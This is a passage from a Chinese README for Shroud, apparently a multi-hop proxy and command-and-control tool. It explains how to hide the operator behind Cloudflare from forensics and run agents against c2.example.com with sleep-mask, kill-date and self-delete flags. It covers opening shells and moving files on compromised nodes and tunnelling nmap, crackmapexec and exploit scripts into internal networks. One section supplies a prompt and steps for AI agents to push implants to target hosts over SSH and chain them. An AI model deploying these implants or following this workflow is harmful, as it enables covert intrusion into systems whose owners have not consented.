        proxy_http_version 1.1;
        proxy_set_header Upgrade $http_upgrade;
        proxy_set_header Connection "upgrade";
        proxy_read_timeout 86400s;
    }
}
```

> Cloudflare 提供免费的 Origin Certificate（15年有效期），在 SSL/TLS → Origin Server 中生成，无需自购证书。

**第三步：启动 Shroud**

```bash
# Operator (Admin，监听在Nginx后面)
./shroud_admin -l 8000 -s <secret> --down ws --heartbeat --passphrase <pass>

# Target (Agent，连接CDN域名)
./shroud_agent -c c2.example.com:443 -s <secret> \
  --up ws --tls-enable --domain c2.example.com --reconnect 30
```

**安全效果：**

| 层面 | 保护效果 |
|------|---------|
| Agent 视角 | 只知道 `c2.example.com`，DNS 解析到 Cloudflare IP，不知道 Admin 真实 IP |
| 网络取证 | 流量目标是 Cloudflare CDN IP，形似正常 HTTPS 网站访问 |
| CDN 被溯源 | 攻击者需要突破 Cloudflare 才能找到 Origin IP |
| Origin 加固 | Nginx 防火墙仅允许 [Cloudflare IP段](https://www.cloudflare.com/ips/) 入站，其他来源全部拒绝 |

**可选加固：** Nginx 防火墙仅放行 Cloudflare IP 段，防止攻击者直接扫描 Origin：

```bash
# 仅允许 Cloudflare IP 访问 Nginx 443 端口
for ip in $(curl -s https://www.cloudflare.com/ips-v4); do
  iptables -A INPUT -p tcp --dport 443 -s $ip -j ACCEPT
done
iptables -A INPUT -p tcp --dport 443 -j DROP
```

## 自动化部署

Shroud的Admin支持`--script`模式，从stdin读取命令而非交互式终端，适合脚本化和AI Agent自动化部署。

### 拓扑描述格式

用以下YAML格式描述你的部署拓扑，AI Agent或部署脚本可据此自动完成全部操作：

```yaml
# shroud-topology.yaml
secret: "<用 openssl rand -base64 24 生成>"
passphrase: "<用 openssl rand -base64 24 生成>"  # 可选，身份文件加密口令

admin:
  host: "operator.local"          # Operator工作站地址
  listen: 9999                    # Admin监听端口
  options: "--down ws --tls-enable --heartbeat --pad-size 4096"

agents:
  - name: "agent-0"
    host: "10.0.1.10"             # 目标机器地址
    ssh_user: "root"              # SSH登录用户
    ssh_port: 22                  # SSH端口
    ssh_auth: "key"               # key 或 password
    ssh_key: "~/.ssh/id_ed25519"  # ssh_auth=key 时填写
    platform: "linux_amd64"       # 编译目标: linux_amd64/linux_arm64/windows_amd64/...
    connect_to: "admin"           # 连接目标: admin 或某个 agent 的 name
    options: "--up ws --tls-enable --reconnect 30 --sleep-mask"

  - name: "agent-1"
    host: "10.0.2.20"
    ssh_user: "ubuntu"
    ssh_port: 22
    ssh_auth: "password"
    platform: "linux_amd64"
    connect_to: "agent-0"         # 通过 agent-0 的 listen 连入
    options: "--up ws --tls-enable --reconnect 30"

  - name: "agent-2"
    host: "192.168.1.100"
    ssh_user: "admin"
    ssh_port: 22
    ssh_auth: "key"
    ssh_key: "~/.ssh/id_rsa"
    platform: "linux_arm64"
    connect_to: "agent-1"
    options: "--up ws --tls-enable --reconnect 30 --kill-date 2026-07-15 --self-delete"
```

### 执行步骤

AI Agent或部署脚本按以下顺序执行：

```
步骤1: 编译
  make <platform>_agent    # 为每个目标平台编译对应的agent二进制
  make admin               # 编译admin

步骤2: 分发
  对每个agent节点:
    scp shroud_agent_<platform> <ssh_user>@<host>:/tmp/shroud_agent

步骤3: 启动Admin
  ./shroud_admin -l <listen_port> -s <secret> [options] --script < commands.txt
  # 或不使用 --script，手动/AI操作交互式控制台

步骤4: 启动第一个Agent (connect_to: admin)
  ssh <agent-0> "/tmp/shroud_agent -c <admin_host>:<port> -s <secret> [options] &"

步骤5: 串联后续节点
  对每个 connect_to 非 admin 的 agent，按依赖顺序:
    a. Admin控制台中，在父节点执行 listen:
       use <父节点id>
       listen           # 选择 1.Normal Passive，输入端口
    b. SSH到目标机启动agent:
       ssh <agent-N> "/tmp/shroud_agent -c <父节点host>:<port> -s <secret> [options] &"

步骤6: 验证
  在Admin控制台执行 topo，确认所有节点在线且拓扑正确
```

### --script 模式用法

`--script`标志使Admin从stdin逐行读取命令，适合管道输入：

```bash
# 启动admin后自动在node 0上开启SOCKS5代理
echo -e "use 0\nsocks 7777" | ./shroud_admin -l 9999 -s <secret> --script

# 或从脚本文件读取
cat <<'EOF' > commands.txt
use 0
listen
1
10000
EOF
./shroud_admin -l 9999 -s <secret> --script < commands.txt
```

`--script`模式下Admin不显示交互式提示符，所有输出仍打印到stdout，适合AI Agent解析。当stdin到达EOF时Admin自动退出。

### 给AI Agent的提示词示例

将以下内容（或项目README链接）提供给AI Agent即可：

```
请帮我部署Shroud多级代理网络。

项目地址: https://github.com/<your-repo>/Shroud
部署拓扑: [粘贴上方YAML或口述你的网络结构]
目标机器SSH信息: [提供或让AI逐个询问]

请按照README中"自动化部署"章节的步骤执行：
编译 → 分发 → 启动Admin → 逐级启动Agent → 验证拓扑
```

## 命令解析

在admin控制台中，用户可以用tab来补全命令，方向键上下左右来查找历史/移动光标

admin控制台分为两个层级，第一层为主panel，包含的命令如下

- `help`: 展示主panel的帮助信息

```
(admin) >> help
  help                                     		Show help information
  detail                                  		Display connected nodes' detail
  topo                                     		Display nodes' topology
  use        <id>                          		Select the target node you want to use
  exit                                     		Exit Shroud
```

- `detail`: 展示在线节点的详细信息

```
(admin) >> detail
Node[0] -> IP: 127.0.0.1:10000  Hostname: test-host.lan  User: testuser
Memo:
```

- `topo`: 展示在线节点的父子关系

```
(admin) >> topo
Node[0]'s children ->
Node[1]

Node[1]'s children ->
```

- `use`: 使用某个agent

```
(admin) >> use 0
(node 0) >>
```

- `exit`: 退出shroud

```
(admin) >> exit
[*] Do you really want to exit shroud?(y/n): y
[*] BYE!
```

当用户使用`use`命令选择了一个agent后，进入第二层node panel，其包含的命令如下

- `help`: 展示node panel的帮助信息

```
(node 0) >> help
  help                                            Show help information
  status                                          Show node status,including socks/forward/backward
  listen                                          Start port listening on current node
  addmemo    <string>                             Add memo for current node
  delmemo                                         Delete memo of current node
  ssh        <ip:port>                            Start SSH through current node
  shell                                           Start an interactive shell on current node
  socks      <lport> [username] [pass]            Start a socks5 server
  stopsocks                                       Shut down socks services
  connect    <ip:port>                            Connect to a new node
  sshtunnel  <ip:sshport> <agent port>            Use sshtunnel to add the node into our topology
  upload     <local filename> <remote filename>   Upload file to current node
  download   <remote filename> <local filename>   Download file from current node
  forward    <lport> <ip:port>                    Forward local port to specific remote ip:port
  stopforward                                     Shut down forward services
  backward    <rport> <lport>                     Backward remote port(agent) to local port(admin)
  stopbackward                                    Shut down backward services
  transport  <tor|raw>                            Switch transport mode (tor=Tor anonymity, raw=direct TCP)
  newcircuit                                      Request a new Tor circuit for current node
  shutdown                                        Terminate current node
  back                                            Back to parent panel
  exit                                            Exit Shroud 
```
- `status`: 展示当前节点的socks/forward/backward状态

```
(node 0) >> status
Socks status:
      ListenAddr: 127.0.0.1:10000    Username:    Password:
-------------------------------------------------------------------------------------------
Forward status:
      [1] Listening Addr: [::]:20000 , Remote Addr: 192.168.1.1:22 , Active Connections: 0
      [2] Listening Addr: [::]:30000 , Remote Addr: 192.168.1.1:22 , Active Connections: 0
-------------------------------------------------------------------------------------------
Backward status:
      [1] Remote Port: 40000 , Local Port: 50000 , Active Connections: 0
```

- `listen`: 命令agent监听某个端口并等待子节点的连入

```
(node 0) >> listen
[*] MENTION! If you choose IPTables Reuse or SOReuse, you MUST CONFIRM that the node was initially started in the corresponding way!
[*] When you choose IPTables Reuse or SOReuse, the node will use the initial config(when node started) to reuse port!
[*] Please choose the mode(1.Normal passive / 2.IPTables Reuse / 3.SOReuse / 4.Tor Hidden Service): 1
[*] Please input the [ip:]<port> : 10001
[*] Waiting for response......
[*] Node is listening on 10001
```

注意，`listen`是比较特殊的一个命令，可以看到，`listen`命令有四种模式

1. `Normal passive`: 此选项意味着agent将会以普通的方式监听在目标端口，并等待子节点连入
2. `IPTables Reuse`：此选项意味着agent将会以IPTables Reuse的方式复用端口，并等待子节点连入
3. `SOReuse`：此选项意味着agent将会以SOReuse的方式复用端口，并等待子节点连入
4. `Tor Hidden Service`：此选项意味着agent将会以Tor隐藏服务的方式创建.onion地址，并等待子节点通过Tor网络连入

第一个模式是最普遍使用的，若父节点以这种方式监听，那么子节点仅需要`-c 父节点ip:port`就可以加入网络

第二个和第三个模式是比较特殊的，若用户选择第二或第三个模式，那么用户必须保证当前操作的节点本身就是以端口复用的方式启动的，否则将无法使用这两个模式

第二和第三个模式将不需要用户输入任何信息，节点将会自动使用其自身启动时的参数来复用端口，并准备接受子节点的连接

第四个模式需要agent所在主机已运行Tor服务且控制端口可用，节点将通过Tor控制端口创建隐藏服务并返回.onion地址

另外，`listen`一次只能接受一个子节点的连入，若需要多个子节点连入，请执行相应次数的`listen`命令

- `addmemo`: 为当前节点添加备忘

```
(node 0) >> addmemo test
[*] Memo added!
(node 0) >> exit
(admin) >> detail
Node[0] -> IP: 127.0.0.1:10000  Hostname: test-host.lan  User: testuser
Memo:  test
```

- `delmemo`: 删除当前节点的备忘

```
(node 0) >> delmemo
[*] Memo deleted!
(node 0) >> exit
(admin) >> detail
Node[0] -> IP: 127.0.0.1:10000  Hostname: test-host.lan  User: testuser
Memo:
```

- `ssh`: 命令节点以ssh方式连接目标机器

```
(node 0) >> ssh 127.0.0.1:22
[*] Please choose the auth method(1.username&&password / 2.certificate): 1
[*] Please enter the username: testuser
[*] Please enter the password: *****
[*] Waiting for response.....
[*] Connect to target host via ssh successfully!
$ whoami
testuser
$
```

在此模式下，tab键将被禁止

- `shell`: 获取当前节点的shell

```
(node 0) >> shell
[*] Waiting for response.....
[*] Shell is started successfully!

bash: no job control in this shell

bash-3.2$ whoami
testuser
bash-3.2$
```

在此模式下，tab键将被禁止

- `socks`：在当前节点上启动socks5服务

```
(node 0) >> socks 7777
[*] Trying to listen on 127.0.0.1:7777......
[*] Waiting for response......
[*] Socks start successfully!
(node 0) >>
```

注意一点，此处的7777端口不是在agent上开启的，而是在admin上开启

若需要设置用户名密码，可将上方命令改为`socks 7777 <your username> <your password>`

若需要指定监听的接口，可将上方命令改为`socks xxx.xxx.xxx.xxx:7777`

- `stopsocks`: 停止在当前节点上的socks5服务

```
(node 0) >> stopsocks
Socks Info ---> ListenAddr: 127.0.0.1:7777    Username: <null>    Password: <null>
[*] Do you really want to shut down socks?(yes/no): yes
[*] Closing......
[*] Socks service has been closed successfully!
(node 0) >>
```

#### 代理使用指南

执行 `socks 7777` 后，Admin 会在 **本地** 开启 127.0.0.1:7777 的 SOCKS5 监听。所有经此端口的流量将通过节点链转发至目标网络。下面说明如何让你的工具走这条隧道。

> **概念区分**
> | | `--socks5-proxy` 参数 | `socks` 命令 |
> |--|--|--|
> | 作用 | Agent/Admin 自身出网经过的代理 | Operator 工具流量的代理入口 |
> | 使用者 | Shroud 节点连接阶段 | 你的 nmap/curl/浏览器等 |
> | 方向 | Agent → 企业代理 → Admin | 你的工具 → Admin:7777 → Agent → 目标 |

**方式一：proxychains4（推荐）**

大多数渗透工具不原生支持 SOCKS5，用 proxychains4 包裹进程即可劫持所有 TCP 连接：

```bash
# 1. 安装
apt install proxychains4    # Debian/Ubuntu
brew install proxychains-ng # macOS

# 2. 配置 /etc/proxychains4.conf（或 ~/.proxychains/proxychains.conf）
#    末尾 [ProxyList] 改为：
socks5 127.0.0.1 7777
#    如果设置了用户名密码：
socks5 127.0.0.1 7777 username password

#    确保以下行未被注释（防止 DNS 泄漏）：
proxy_dns

# 3. 使用 —— 在任意命令前加 proxychains4
proxychains4 nmap -sT -Pn 10.0.0.0/24      # TCP 端口扫描
proxychains4 curl http://10.0.0.1:8080      # HTTP 请求
proxychains4 ssh user@10.0.0.5              # SSH 登录
proxychains4 crackmapexec smb 10.0.0.0/24   # 批量 SMB 扫描
proxychains4 python3 exploit.py             # 任意脚本
```

proxychains4 包裹的是 **进程**，不是单次请求。批量扫描、多线程工具、脚本调用都可以直接套用。

**方式二：工具原生 SOCKS5 支持**

部分工具自带代理参数，无需 proxychains：

```bash
# curl
curl --socks5-hostname 127.0.0.1:7777 http://10.0.0.1:8080

# wget
wget -e "use_proxy=yes" -e "socks_proxy=socks5://127.0.0.1:7777" http://10.0.0.1

# Firefox / Burp Suite
#   设置 → 网络 → 手动代理 → SOCKS Host: 127.0.0.1, Port: 7777, SOCKS v5
#   勾选 "Proxy DNS when using SOCKS v5"

# Python requests（通过 PySocks）
pip install requests[socks]
proxies = {"http": "socks5h://127.0.0.1:7777", "https": "socks5h://127.0.0.1:7777"}
requests.get("http://10.0.0.1", proxies=proxies)
```

> `socks5h://` 表示 DNS 也由远端解析，避免本地 DNS 泄漏。`socks5://` 会在本地解析 DNS。

**方式三：环境变量（部分工具支持）**

```bash
export ALL_PROXY=socks5h://127.0.0.1:7777
curl http://10.0.0.1   # curl 会读取 ALL_PROXY
```

注意：多数渗透工具（nmap、masscan 等）**不读取**环境变量代理设置，仍需用 proxychains4。

**注意事项**

- **TCP only**：proxychains4 仅劫持 TCP 连接。`nmap -sU`（UDP 扫描）、`ping`（ICMP）无法代理，请改用 `nmap -sT`
- **DNS 泄漏**：务必启用 `proxy_dns`（proxychains）或使用 `socks5h://`（原生支持），否则 DNS 请求会从本地直接发出，暴露目标域名
- **性能**：多级隧道会增加延迟。批量扫描建议降低并发（如 `nmap -T3`），避免隧道拥塞
- **UDP 限制**：Shroud 的 SOCKS5 支持标准 RFC1928 UDP ASSOCIATE，但多数扫描工具的 UDP 实现不兼容。UDP 扫描建议在拿到 shell 后在目标上本地执行

- `connect`: 命令当前节点连接至另一个子节点

```
agent-1: ./shroud_agent -l 10002
```

```
(node 0) >> connect 127.0.0.1:10002
[*] Waiting for response......
[*] New node online! Node id is 1

(node 0) >>
```

- `sshtunnel`: 命令当前节点以ssh隧道的方式连接至另一个子节点

```
agent-2: ./shroud_agent -l 10003
```

```
(node 0) >> sshtunnel 127.0.0.1:22 10003
[*] Please choose the auth method(1.username&&password / 2.certificate): 1
[*] Please enter the username: testuser
[*] Please enter the password: ******
[*] Waiting for response.....
[*] New node online! Node id is 2

(node 0) >>
```

在严格受限的网络环境下，可以利用ssh隧道的方式来将shroud的流量伪装为ssh流量，从而避开防火墙的限制

- `upload`: 向当前节点上传文件

```
(node 0) >> upload test.7z test.xxx
[*] File transmitting, please wait...
136.07 KiB / 136.07 KiB [-----------------------------------------------------------------------------------] 100.00% ? p/s 0s
```

- `download`: 下载当前节点上的文件

```
(node 0) >> download test.xxx test.xxxx
[*] File transmitting, please wait...
136.07 KiB / 136.07 KiB [-----------------------------------------------------------------------------------] 100.00% ? p/s 0s
```

- `forward`: 映射admin上的端口至远程端口

```
(node 0) >> forward 9000 127.0.0.1:22
[*] Trying to listen on 127.0.0.1:9000......
[*] Waiting for response......
[*] Forward start successfully!
(node 0) >>
```

```
$ ssh 127.0.0.1 -p 9000
Password:
$
```

- `stopforward`: 关闭当前节点的远程映射

```
(node 0) >> stopforward
[0] All
[1] Listening Addr : [::]:9000 , Remote Addr : 127.0.0.1:22 , Active Connections : 1
[*] Do you really want to shut down forward?(yes/no): yes
[*] Please choose one to close: 1
[*] Closing......
[*] Forward service has been closed successfully!
```

- `backward`: 反向映射当前agent上的端口至admin的本地端口

```
(node 0) >> backward 9001 22
[*] Trying to ask node to listen on 127.0.0.1:9001......
[*] Waiting for response......
[*] Backward start successfully!
(node 0) >>
```

```
$ ssh 127.0.0.1 -p 9001
Password:
$
```

- `stopbackward`: 关闭当前节点的反向映射

```
(node 0) >> stopbackward
[0] All
[1] Remote Port : 9001 , Local Port : 22 , Active Connections : 1
[*] Do you really want to shut down backward?(yes/no): yes
[*] Please choose one to close: 1
[*] Closing......
[*] Backward service has been closed successfully!
```

- `transport`: 切换当前节点的传输模式

```
(node 0) >> transport tor
[*] Switching transport to Tor mode......
[*] Transport switched successfully!
(node 0) >>
```

```
(node 0) >> transport raw
[*] Switching transport to raw TCP mode......
[*] Transport switched successfully!
(node 0) >>
```

- `newcircuit`: 请求当前节点更换Tor线路

```
(node 0) >> newcircuit
[*] Requesting new Tor circuit......
[*] New circuit established!
(node 0) >>
```

- `shutdown`: 命令当前节点下线

```
(node 1) >> shutdown
(node 1) >>
[*] Node 1 is offline!
```

- `back`: 退回到主panel

```
(node 1) >> back
(admin) >>
```

- `exit`: 退出shroud

```
(node 1) >> exit
[*] Do you really want to exit shroud?(y/n): y
[*] BYE!
```

## 注意事项

- 此程序仅是闲暇时开发学习，结构及代码结构不够严谨，功能可能存在bug，请多多谅解
- admin不在线时，新节点将不允许加入
- admin仅支持一个直接连接的agent节点，agent节点则无此限制
- 本程序仅支持标准的基于[RFC1928](https://www.ietf.org/rfc/rfc1928.txt)所阐述的`UDP ASSOCIATE`，请在使用socks5 udp代理时注意您所使用的程序(例如扫描器等)，包构造方式必须遵守标准的[RFC1928](https://www.ietf.org/rfc/rfc1928.txt)，并且需要自行处理丢包状况
- 节点掉线后，与该节点及其所有子节点相关的socks、forward、backward服务会被强制停止
- 如因中间节点掉线导致分支断开，重连时**必须连接缺失链的头节点**，不要跳过中间节点直接连接末端节点，否则中间节点的子树将无法恢复
- IPTABLES端口复用模式下，agent被`kill -9`杀死时无法自动清理iptables规则，需手动执行`python reuse.py --stop --rhost <ip> --rport <port>`恢复原服务访问
- IPTABLES端口复用模式将强制监听在`0.0.0.0`，无法由`-l`参数指定IP

